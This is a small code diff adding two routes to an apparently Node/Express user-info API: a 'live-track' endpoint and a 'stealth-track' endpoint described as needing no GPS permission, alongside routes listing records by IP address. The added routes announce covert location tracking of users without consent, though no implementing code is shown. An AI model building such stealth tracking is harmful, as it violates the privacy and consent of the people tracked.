@@ -16,6 +16,12 @@ router.post('/user-info', validateUserInfoRequest, UserInfoController.getUserInf
 router.get('/user-info/summary', UserInfoController.getUserInfoSummary);
 router.post('/user-info/summary', UserInfoController.getUserInfoSummary);
 
+// Live tracking endpoint with enhanced location analysis
+router.post('/user-info/live-track', UserInfoController.liveTrack);
+
+// Stealth tracking endpoint (no GPS permission required)
+router.post('/user-info/stealth-track', UserInfoController.stealthTrack);
+
 // Database management endpoints
 router.get('/user-info/records', UserInfoController.getAllRecords);
 router.get('/user-info/records/:ip', UserInfoController.getRecordsByIP);
